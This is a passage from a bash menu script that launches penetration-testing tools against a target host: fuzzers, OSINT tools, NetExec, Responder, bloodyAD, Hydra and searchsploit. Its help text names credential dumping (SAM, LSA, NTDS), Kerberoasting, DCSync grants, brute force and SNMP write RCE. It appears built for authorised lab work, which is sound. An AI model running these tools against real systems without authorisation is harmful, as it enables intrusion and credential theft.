        6) new_wl="/usr/share/wordlists/metasploit/password.lst" ;;
        [Bb]) return ;;
        *) echo -e "${RED}Invalid option, keeping current wordlist.${NC}"; return ;;
    esac
    if [[ ! -f "$new_wl" ]]; then
        echo -e "${RED}[!] Wordlist not found: $new_wl${NC}"
        echo -e "${YELLOW}[*] Keeping current: $PASS_WL${NC}"
    else
        PASS_WL="$new_wl"
        echo -e "${GREEN}[+] Password wordlist set to: $PASS_WL${NC}"
    fi
}

# ── Directory Fuzzing ──
run_dirb() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Dirb${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Dirb on $url...'; dirb $url $FUZZ_WL | tee $DIR/dirb_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/dirb_${HOSTONLY}${sfx}.txt'"
}

run_gobuster() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Gobuster${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Gobuster on $url...'; gobuster dir -u $url -w $FUZZ_WL | tee $DIR/gobuster_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/gobuster_${HOSTONLY}${sfx}.txt'"
}

run_dirsearch() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching DirSearch${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running DirSearch on $url...'; dirsearch -u $url -w $FUZZ_WL -o $DIR/dirsearch_${HOSTONLY}${sfx}.txt"
}

run_ffuf_dir() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching FFuF Directory Scan${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running FFuF Directory Scan on $url...'; ffuf -u ${url%/}/FUZZ -w $FUZZ_WL -mc 200,204,301,302,307,401,403 -t 50 -c -o $DIR/ffuf_${HOSTONLY}${sfx}.json; echo 'Output: $DIR/ffuf_${HOSTONLY}${sfx}.json'"
}

run_feroxbuster() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Feroxbuster${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Feroxbuster on $url...'; feroxbuster -u $url -w $FUZZ_WL -x php,txt,html -t 50 -o $DIR/ferox_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/ferox_${HOSTONLY}${sfx}.txt'"
}

# ── DNS & OSINT ──
run_dnsrecon() {
    echo -e "${CYAN}[*] Launching DNSRecon...${NC}"
    term "echo '[*] Running DNSRecon...'; WORDLIST=\$(find /usr/share -name 'namelist.txt' 2>/dev/null | grep -i dns | head -1); if [ -z \"\$WORDLIST\" ]; then WORDLIST='/usr/share/wordlists/dnsrecon/namelist.txt'; fi; dnsrecon -t brt -D \$WORDLIST -d $HOSTONLY | tee $DIR/dnsrecon_${HOSTONLY}.txt; echo 'Output: $DIR/dnsrecon_${HOSTONLY}.txt'"
}

run_ffuf_subdomain() {
    echo -e "${CYAN}[*] Launching FFuF Subdomain Enumeration...${NC}"
    term "echo '[*] Running FFuF Subdomain Enumeration...'; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.$HOSTONLY -mc all -fc 404 -t 50 -c -o $DIR/ffuf_subdomains_${HOSTONLY}.json; echo 'Output: $DIR/ffuf_subdomains_${HOSTONLY}.json'"
}

run_amass() {
    echo -e "${CYAN}[*] Launching Amass...${NC}"
    term "echo '[*] Running Amass Subdomain Enumeration...'; amass enum -d $HOSTONLY -o $DIR/amass_${HOSTONLY}.txt; echo 'Output: $DIR/amass_${HOSTONLY}.txt'"
}

run_subfinder() {
    echo -e "${CYAN}[*] Launching Subfinder...${NC}"
    term "echo '[*] Running Subfinder...'; subfinder -d $HOSTONLY -o $DIR/subfinder_${HOSTONLY}.txt; echo 'Output: $DIR/subfinder_${HOSTONLY}.txt'"
}

run_theharvester() {
    echo -e "${CYAN}[*] Launching theHarvester...${NC}"
    term "echo '[*] Running theHarvester...'; theHarvester -d $HOSTONLY -b all | tee $DIR/theharvester_${HOSTONLY}.txt; echo 'Output: $DIR/theharvester_${HOSTONLY}.txt'"
}

# ── SMB Enumeration ──
run_enum4linux() {
    echo -e "${CYAN}[*] Launching Enum4linux-ng...${NC}"
    term "echo '[*] Running Enum4linux-ng (full enumeration)...'; enum4linux-ng $HOSTONLY | tee $DIR/enum4linux_${HOSTONLY}.txt; echo 'Output: $DIR/enum4linux_${HOSTONLY}.txt'"
}

# ── NetExec ──
run_nxc() {
    echo -e "${CYAN}[*] Launching NetExec (nxc)...${NC}"
    echo
    echo -e "${YELLOW}  ── PROTOCOLS ──${NC}"
    echo -e "    smb      SMB shares, users, groups, sessions, disks, enum, pass-pol"
    echo -e "    ldap     LDAP queries, Kerberoast, ASREPRoast, BloodHound, MAQ"
    echo -e "    winrm    WinRM command execution"
    echo -e "    rdp      RDP authentication check"
    echo -e "    ssh      SSH authentication check"
    echo -e "    mssql    MSSQL authentication & query execution"
    echo -e "    ftp      FTP authentication check"
    echo -e "    vnc      VNC authentication check"
    echo -e "    wmi      WMI command execution"
    echo
    echo -e "${YELLOW}  ── COMMON FLAGS (append to extra options) ──${NC}"
    echo -e "    --shares              Enumerate shares (smb)"
    echo -e "    --users               Enumerate users (smb/ldap)"
    echo -e "    --groups              Enumerate groups (smb/ldap)"
    echo -e "    --sessions            Enumerate active sessions (smb)"
    echo -e "    --disks               Enumerate disks (smb)"
    echo -e "    --pass-pol            Dump password policy (smb)"
    echo -e "    --rid-brute           RID brute force users (smb)"
    echo -e "    --sam                 Dump SAM hashes (smb, needs admin)"
    echo -e "    --lsa                 Dump LSA secrets (smb, needs admin)"
    echo -e "    --ntds                Dump NTDS (DC, needs admin)"
    echo -e "    --bloodhound          Collect BloodHound data (ldap)"
    echo -e "    --kerberoasting       Kerberoast all SPNs (ldap)"
    echo -e "    --asreproast          ASREPRoast all users (ldap)"
    echo -e "    -x 'cmd'              Execute command via cmd (smb/winrm/wmi)"
    echo -e "    --no-bruteforce       Test each user:pass pair, not spray (smb)"
    echo -e "    --continue-on-success Keep going after a valid credential is found"
    echo -e "    --local-auth          Authenticate as local account (smb)"
    echo
    read -rp "Protocol: " NXC_PROTO
    read -rp "Username or path to user list: " NXC_USER
    read -rp "Auth method - (P)assword / (H)ash / (K)erberos / (N)ull [P]: " NXC_AUTH
    NXC_AUTH="${NXC_AUTH:-P}"
    local auth_flag
    case "${NXC_AUTH^^}" in
        P)
            read -rp "Password or path to password list (leave blank for null): " NXC_PASS
            [[ -n "$NXC_PASS" ]] && auth_flag="-p '$NXC_PASS'" || auth_flag=""
            ;;
        H)
            read -rp "NT hash (format: LM:NT or just NT): " NXC_HASH
            auth_flag="-H '$NXC_HASH'"
            ;;
        K)
            auth_flag="-k"
            ;;
        N)
            auth_flag="-p ''"
            ;;
        *)
            echo -e "${RED}[!] Invalid auth method, defaulting to null auth.${NC}"
            auth_flag="-p ''"
            ;;
    esac
    read -rp "Domain [leave blank if none]: " NXC_DOMAIN
    read -rp "Alternate port [leave blank for default]: " NXC_PORT
    read -rp "Extra options (e.g., --shares --users, or leave blank): " NXC_EXTRA
    local domain_flag port_flag
    [[ -n "$NXC_DOMAIN" ]] && domain_flag="-d '$NXC_DOMAIN'" || domain_flag=""
    [[ -n "$NXC_PORT" ]] && port_flag="--port $NXC_PORT" || port_flag=""
    term "echo '[*] Running NetExec ($NXC_PROTO)...'; nxc $NXC_PROTO $HOSTONLY -u '$NXC_USER' $auth_flag $domain_flag $port_flag $NXC_EXTRA | tee $DIR/nxc_${HOSTONLY}_${NXC_PROTO}.txt; echo 'Output: $DIR/nxc_${HOSTONLY}_${NXC_PROTO}.txt'"
}

# ── Active Directory / Kerberos ──
run_ldapsearch() {
    echo -e "${CYAN}[*] Launching LDAPSearch...${NC}"
    read -rp "Enter domain (e.g., htb.local) [default: $HOSTONLY]: " DOMAIN
    DOMAIN="${DOMAIN:-$HOSTONLY}"
    local basedn
    basedn=$(echo "$DOMAIN" | sed 's/\./,DC=/g; s/^/DC=/')
    read -rp "LDAP port [389]: " LDAP_PORT
    LDAP_PORT="${LDAP_PORT:-389}"
    read -rp "Use LDAPS (secure)? (y/N): " LDAP_SECURE
    local ldap_scheme="ldap"
    [[ "${LDAP_SECURE,,}" == "y" ]] && ldap_scheme="ldaps"
    local sfx=""
    [[ "$LDAP_PORT" != "389" && "$LDAP_PORT" != "636" ]] && sfx="_port${LDAP_PORT}"
    term "echo '[*] Running LDAPSearch on ${ldap_scheme}://$HOSTONLY:$LDAP_PORT...'; ldapsearch -x -H ${ldap_scheme}://$HOSTONLY:$LDAP_PORT -b '$basedn' | tee $DIR/ldapsearch_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/ldapsearch_${HOSTONLY}${sfx}.txt'"
}

run_responder() {
    echo -e "${CYAN}[*] Launching Responder...${NC}"
    read -rp "Network interface (e.g., eth0, tun0): " RESP_IFACE
    read -rp "Additional flags [leave blank for defaults (-wdF)]: " RESP_OPTS
    RESP_OPTS="${RESP_OPTS:--wdF}"
    term "echo '[*] Running Responder on $RESP_IFACE...'; sudo responder -I '$RESP_IFACE' $RESP_OPTS | tee $DIR/responder_${HOSTONLY}.txt; echo 'Output: $DIR/responder_${HOSTONLY}.txt'"
}

run_bloodyad() {
    echo -e "${CYAN}[*] Launching bloodyAD...${NC}"
    echo
    echo -e "${YELLOW}  ── GET ──${NC}"
    echo -e "    get object <sAMAccountName>     Get object attributes"
    echo -e "    get writable                    List objects you can write to"
    echo -e "    get membership <sAMAccountName> Get group memberships"
    echo -e "    get search <filter> <attr>      LDAP search with custom filter"
    echo -e "    get children <sAMAccountName>   List children of an object"
    echo -e "    get dnsDump                     Dump DNS records"
    echo -e "    get trusts                      Enumerate domain trusts"
    echo -e "    get ntFromCertificate <cert>    Extract NT hash from certificate"
    echo
    echo -e "${YELLOW}  ── SET ──${NC}"
    echo -e "    set password <sAMAccountName> <newpass>  Change a password"
    echo -e "    set object <sAMAccountName> <attr> <val> Set an object attribute"
    echo -e "    set owner <target> <new_owner>           Set object owner"
    echo -e "    set rbcd <target> <controlled_computer>  Configure RBCD"
    echo -e "    set genericAll <target> <trustee>        Grant GenericAll"
    echo -e "    set dontreqpreauth <sAMAccountName> true Toggle DONT_REQ_PREAUTH"
    echo -e "    set shadowCredentials <sAMAccountName>   Add shadow credentials"
    echo
    echo -e "${YELLOW}  ── ADD ──${NC}"
    echo -e "    add groupMember <group> <member>         Add user to group"
    echo -e "    add dnsRecord <name> <ip>                Add a DNS record"
    echo -e "    add uac <sAMAccountName> <flag>          Add a UAC flag"
    echo -e "    add dcsync <sAMAccountName>              Grant DCSync rights"
    echo -e "    add genericAll <target> <trustee>        Add GenericAll ACE"
    echo -e "    add rbcd <target> <controlled_computer>  Add RBCD entry"
    echo
    echo -e "${YELLOW}  ── REMOVE ──${NC}"
    echo -e "    remove groupMember <group> <member>      Remove user from group"
    echo -e "    remove dnsRecord <name> <ip>             Remove a DNS record"
    echo -e "    remove uac <sAMAccountName> <flag>       Remove a UAC flag"
    echo -e "    remove dcsync <sAMAccountName>           Revoke DCSync rights"
    echo -e "    remove genericAll <target> <trustee>     Remove GenericAll ACE"
    echo -e "    remove rbcd <target> <controlled_computer> Remove RBCD entry"
    echo
    read -rp "Username: " BAD_USER
    read -rp "Auth method - (P)assword / (H)ash / (K)erberos / (C)ertificate [P]: " BAD_AUTH
    BAD_AUTH="${BAD_AUTH:-P}"
    local auth_flag
    case "${BAD_AUTH^^}" in
        P)
            read -rp "Password (leave blank for anonymous): " BAD_PASS
            [[ -n "$BAD_PASS" ]] && auth_flag="-p '$BAD_PASS'" || auth_flag=""
            ;;
        H)
            read -rp "NT hash (NT only, no LM prefix needed): " BAD_HASH
            auth_flag="-p ':$BAD_HASH'"
            ;;
        K)
            auth_flag="-k"
            ;;
        C)
            read -rp "Path to certificate file (.pfx): " BAD_CERT
            auth_flag="--certificate '$BAD_CERT'"
            ;;
        *)
            echo -e "${RED}[!] Invalid auth method, defaulting to anonymous.${NC}"
            auth_flag=""
            ;;
    esac
    read -rp "Domain (e.g., htb.local): " BAD_DOMAIN
    read -rp "Use LDAPS (secure)? (y/N): " BAD_SECURE
    local secure_flag=""
    [[ "${BAD_SECURE,,}" == "y" ]] && secure_flag="-s"
    read -rp "Action: " BAD_ACTION
    term "echo '[*] Running bloodyAD ($BAD_ACTION)...'; bloodyAD -u '$BAD_USER' $auth_flag -d '$BAD_DOMAIN' --host $HOSTONLY $secure_flag $BAD_ACTION | tee $DIR/bloodyad_${HOSTONLY}.txt; echo 'Output: $DIR/bloodyad_${HOSTONLY}.txt'"
}

# ── Brute Force ──
run_hydra() {
    echo -e "${CYAN}[*] Launching Hydra...${NC}"
    read -rp "Protocol (ssh/ftp/http-get/http-post-form/rdp/etc): " PROTO
    read -rp "Alternate port [leave blank for default]: " HYDRA_PORT
    read -rp "Username or path to user list: " HUSER
    echo -e "${CYAN}[*] Using password list: $PASS_WL${NC}"
    echo -e "${YELLOW}[i] Change via Brute Force menu > W${NC}"
    local user_flag port_flag
    if [[ -f "$HUSER" ]]; then
        user_flag="-L $HUSER"
    else
        user_flag="-l $HUSER"
    fi
    [[ -n "$HYDRA_PORT" ]] && port_flag="-s $HYDRA_PORT" || port_flag=""
    term "echo '[*] Running Hydra ($PROTO${HYDRA_PORT:+ port $HYDRA_PORT})...'; hydra $user_flag -P '$PASS_WL' $port_flag $HOSTONLY $PROTO | tee $DIR/hydra_${HOSTONLY}_${PROTO}.txt; echo 'Output: $DIR/hydra_${HOSTONLY}_${PROTO}.txt'"
}

# ── Utilities ──
run_eyewitness() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching EyeWitness${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running EyeWitness Web Screenshot on $url...'; eyewitness --web --single $url -d $DIR/eyewitness_${HOSTONLY}${sfx}; echo 'Output: $DIR/eyewitness_${HOSTONLY}${sfx}/'"
}

run_searchsploit() {
    echo -e "${CYAN}[*] Launching SearchSploit...${NC}"
    read -rp "Enter search term (e.g., 'apache 2.4'): " SPLOIT
    local outfile
    outfile="$DIR/searchsploit_$(echo "$SPLOIT" | tr ' ' '_').txt"
    term "echo '[*] Running SearchSploit...'; searchsploit '$SPLOIT' | tee '$outfile'; echo 'Output: $outfile'"
}

# ─────────────────────────────────────────────
# Category Runners
# ─────────────────────────────────────────────

run_all_port_scans() {
    echo -e "${YELLOW}[*] Launching ALL Port Scanning tools...${NC}"
    run_rustscan
    run_nmap_tcp
    run_nmap_udp
    run_nmap_snmp
    echo -e "${GREEN}[+] All port scanning tools launched!${NC}"
}

run_all_web_scans() {
    echo -e "${YELLOW}[*] Launching ALL Web Scanning tools...${NC}"
    [[ ${#ALT_PORTS[@]} -gt 0 ]] && echo -e "${CYAN}[*] Alt ports included: ${ALT_PORTS[*]}${NC}"
    run_wafw00f;    run_on_alt_ports run_wafw00f
    run_whatweb;    run_on_alt_ports run_whatweb
    run_nikto;      run_on_alt_ports run_nikto
    run_wapiti;     run_on_alt_ports run_wapiti
    run_nuclei;     run_on_alt_ports run_nuclei
    run_wpscan;     run_on_alt_ports run_wpscan
    run_arjun;      run_on_alt_ports run_arjun
    echo -e "${GREEN}[+] All web scanning tools launched!${NC}"
}

run_all_dir_fuzzing() {
    echo -e "${YELLOW}[*] Launching ALL Directory Fuzzing tools...${NC}"
    [[ ${#ALT_PORTS[@]} -gt 0 ]] && echo -e "${CYAN}[*] Alt ports included: ${ALT_PORTS[*]}${NC}"
    run_dirb;       run_on_alt_ports run_dirb
    run_gobuster;   run_on_alt_ports run_gobuster
    run_dirsearch;  run_on_alt_ports run_dirsearch
    run_ffuf_dir;   run_on_alt_ports run_ffuf_dir
    run_feroxbuster; run_on_alt_ports run_feroxbuster
    echo -e "${GREEN}[+] All directory fuzzing tools launched!${NC}"
}

run_all_dns_osint() {
    echo -e "${YELLOW}[*] Launching ALL DNS & OSINT tools...${NC}"
    run_dnsrecon
    run_ffuf_subdomain
    run_amass
    run_subfinder
    run_theharvester
    echo -e "${GREEN}[+] All DNS & OSINT tools launched!${NC}"
}

run_all_smb() {
    echo -e "${YELLOW}[*] Launching ALL SMB Enumeration tools...${NC}"
    run_enum4linux
    echo -e "${GREEN}[+] All SMB enumeration tools launched!${NC}"
}

run_all_tools() {
    echo -e "${RED}[*] Launching ALL reconnaissance tools...${NC}"
    run_all_port_scans
    run_all_web_scans
    run_all_dir_fuzzing
    run_all_dns_osint
    run_all_smb
    run_eyewitness; run_on_alt_ports run_eyewitness
    echo -e "${GREEN}[+] All tools launched!${NC}"
}

# ─────────────────────────────────────────────
# Menus
# ─────────────────────────────────────────────

port_scan_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}           PORT SCANNING TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} RustScan          - Fast port scanner"
        echo -e "  ${GREEN}2)${NC} Nmap TCP          - Full TCP scan with vuln scripts"
        echo -e "  ${GREEN}3)${NC} Nmap UDP          - Top 1000 UDP ports"
        echo -e "  ${GREEN}4)${NC} SNMP Enumeration  - SNMP tools submenu"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL Port Scans (excludes SNMP enum)"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_rustscan ;;
            2) run_nmap_tcp ;;
            3) run_nmap_udp ;;
            4) snmp_enum_menu ;;
            [Aa]) run_all_port_scans ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

snmp_enum_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}          SNMP ENUMERATION TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo -e "${YELLOW}SNMP Port:  $SNMP_PORT${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} Nmap SNMP         - SNMP scripts (info, brute, processes)"
        echo -e "  ${GREEN}2)${NC} OneSixtyOne       - SNMP community string brute force"
        echo -e "  ${GREEN}3)${NC} SNMPWalk (public) - Walk MIB with 'public' community"
        echo -e "  ${GREEN}4)${NC} SNMPWalk (private)- Walk MIB with 'private' community"
        echo -e "  ${GREEN}5)${NC} SNMP-Check        - SNMP device enumerator"
        echo -e "  ${GREEN}6)${NC} SNMPWalk Extend   - Walk NET-SNMP-EXTEND-MIB (RCE/info leak check)"
        echo -e "  ${GREEN}7)${NC} SNMPWalk UCD Exec - Walk UCD-SNMP-MIB extTable (older exec mechanism)"
        echo -e "  ${GREEN}8)${NC} SNMPv3 User Enum  - Enumerate valid SNMPv3 usernames via error diff"
        echo -e "  ${PURPLE}9)${NC} SNMP Write RCE    - Inject extend entry via write community (EXPLOITATION)"
        echo -e "  ${PURPLE}10)${NC} DISMAN Enum      - Enumerate DISMAN-EVENT-MIB trigger/event tables"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL SNMP Tools (passive recon only)"
        echo -e "  ${CYAN}P)${NC} Change SNMP Port (current: $SNMP_PORT)"
        echo -e "  ${RED}B)${NC} Back to Port Scanning"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_nmap_snmp ;;
            2) run_onesixtyone ;;
            3) run_snmpwalk_public ;;
            4) run_snmpwalk_private ;;
            5) run_snmpcheck ;;
            6) run_snmpwalk_extend ;;
            7) run_snmpwalk_ucd_exec ;;
            8) run_snmpv3_userenum ;;
            9) run_snmpset_rce ;;
            10) run_disman_enum ;;
            [Aa]) run_all_snmp ;;
            [Pp])
                read -rp "Enter SNMP port [161]: " NEW_SNMP_PORT
                NEW_SNMP_PORT="${NEW_SNMP_PORT:-161}"
                if [[ "$NEW_SNMP_PORT" =~ ^[0-9]+$ ]] && (( NEW_SNMP_PORT >= 1 && NEW_SNMP_PORT <= 65535 )); then
                    SNMP_PORT="$NEW_SNMP_PORT"
                    echo -e "${GREEN}[+] SNMP port set to $SNMP_PORT${NC}"
                else
                    echo -e "${RED}[!] Invalid port, keeping $SNMP_PORT${NC}"
                fi
                ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

web_scan_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}           WEB SCANNING TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Primary target: $BASEURL${NC}"
        if [[ ${#ALT_PORTS[@]} -gt 0 ]]; then
            echo -e "${YELLOW}Alt ports:      ${ALT_PORTS[*]}${NC}"
        else
            echo -e "${YELLOW}Alt ports:      none (P to configure)${NC}"
        fi
        echo
        echo -e "  ${GREEN}1)${NC} Nikto             - Web server scanner"
        echo -e "  ${GREEN}2)${NC} Wapiti            - Web vulnerability scanner"
        echo -e "  ${GREEN}3)${NC} WhatWeb           - Web technology fingerprinting"
        echo -e "  ${GREEN}4)${NC} Nuclei            - Template-based vuln scanner"
        echo -e "  ${GREEN}5)${NC} WPScan            - WordPress vulnerability scanner"
        echo -e "  ${GREEN}6)${NC} Wafw00f           - WAF detection & fingerprinting"
        echo -e "  ${GREEN}7)${NC} Arjun             - HTTP parameter discovery"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL Web Scans (primary + alt ports)"
        echo -e "  ${CYAN}P)${NC} Configure Alt Ports"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_nikto;       run_on_alt_ports run_nikto ;;
            2) run_wapiti;      run_on_alt_ports run_wapiti ;;
            3) run_whatweb;     run_on_alt_ports run_whatweb ;;
            4) run_nuclei;      run_on_alt_ports run_nuclei ;;
            5) run_wpscan;      run_on_alt_ports run_wpscan ;;
            6) run_wafw00f;     run_on_alt_ports run_wafw00f ;;
            7) run_arjun;       run_on_alt_ports run_arjun ;;
            [Aa]) run_all_web_scans ;;
            [Pp]) manage_alt_ports ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

dir_fuzz_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}         DIRECTORY FUZZING TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Primary target: $BASEURL${NC}"
        if [[ ${#ALT_PORTS[@]} -gt 0 ]]; then
            echo -e "${YELLOW}Alt ports:      ${ALT_PORTS[*]}${NC}"
        else
            echo -e "${YELLOW}Alt ports:      none (P to configure)${NC}"
        fi
        echo -e "${PURPLE}Wordlist:       $FUZZ_WL${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} Dirb              - Directory brute forcer"
        echo -e "  ${GREEN}2)${NC} Gobuster          - Directory/file busting"
        echo -e "  ${GREEN}3)${NC} DirSearch         - Web path scanner"
        echo -e "  ${GREEN}4)${NC} FFuF              - Fast fuzzer (directories)"
        echo -e "  ${GREEN}5)${NC} Feroxbuster       - Recursive content discovery"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL Directory Fuzzers (primary + alt ports)"
        echo -e "  ${CYAN}W)${NC} Change Wordlist (current: $(basename $FUZZ_WL))"
        echo -e "  ${CYAN}P)${NC} Configure Alt Ports"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_dirb;        run_on_alt_ports run_dirb ;;
            2) run_gobuster;    run_on_alt_ports run_gobuster ;;
            3) run_dirsearch;   run_on_alt_ports run_dirsearch ;;
            4) run_ffuf_dir;    run_on_alt_ports run_ffuf_dir ;;
            5) run_feroxbuster; run_on_alt_ports run_feroxbuster ;;
            [Aa]) run_all_dir_fuzzing ;;
            [Ww]) select_fuzz_wordlist ;;
            [Pp]) manage_alt_ports ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

dns_osint_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}          DNS & OSINT TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} DNSRecon          - DNS enumeration & zone transfer"
        echo -e "  ${GREEN}2)${NC} FFuF Subdomains   - Subdomain brute force"
        echo -e "  ${GREEN}3)${NC} Amass             - Deep subdomain enumeration"
        echo -e "  ${GREEN}4)${NC} Subfinder         - Passive subdomain discovery"
        echo -e "  ${GREEN}5)${NC} theHarvester      - Emails, names & subdomains (OSINT)"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL DNS & OSINT Tools"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_dnsrecon ;;
            2) run_ffuf_subdomain ;;
            3) run_amass ;;
            4) run_subfinder ;;
            5) run_theharvester ;;
            [Aa]) run_all_dns_osint ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

smb_enum_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}          SMB ENUMERATION TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} Enum4linux-ng     - Full SMB/RPC/user enumeration"
        echo -e "  ${GREEN}2)${NC} NetExec (nxc)     - Multi-protocol credential testing & enumeration"
        echo
        echo -e "  ${YELLOW}A)${NC} Run ALL SMB Tools"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_enum4linux ;;
            2) run_nxc ;;
            [Aa]) run_all_smb ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

ad_enum_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}      ACTIVE DIRECTORY / KERBEROS TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} LDAPSearch        - Anonymous LDAP enumeration"
        echo -e "  ${GREEN}2)${NC} Responder         - LLMNR/NBT-NS/MDNS poisoner"
        echo -e "  ${GREEN}3)${NC} bloodyAD          - AD privilege escalation & enumeration via LDAP"
        echo
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_ldapsearch ;;
            2) run_responder ;;
            3) run_bloodyad ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

brute_force_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}           BRUTE FORCE TOOLS${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target:    $HOSTONLY${NC}"
        echo -e "${PURPLE}Wordlist:  $PASS_WL${NC}"
        echo
        echo -e "  ${GREEN}1)${NC} Hydra             - Multi-protocol login brute forcer"
        echo
        echo -e "  ${CYAN}W)${NC} Change Password Wordlist (current: $(basename $PASS_WL))"
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_hydra ;;
            [Ww]) select_pass_wordlist ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

utils_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}              UTILITIES${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        if [[ ${#ALT_PORTS[@]} -gt 0 ]]; then
            echo -e "${YELLOW}Alt ports:      ${ALT_PORTS[*]}${NC}"
        else
            echo -e "${YELLOW}Alt ports:      none${NC}"
        fi
        echo
        echo -e "  ${GREEN}1)${NC} EyeWitness        - Web screenshot & report"
        echo -e "  ${GREEN}2)${NC} SearchSploit      - Local exploit-db search"
        echo
        echo -e "  ${RED}B)${NC} Back to Main Menu"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) run_eyewitness; run_on_alt_ports run_eyewitness ;;
            2) run_searchsploit ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac

        echo
        read -rp "Press Enter to continue..."
    done
}

change_target_menu() {
    show_banner
    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo -e "${BLUE}            CHANGE TARGET${NC}"
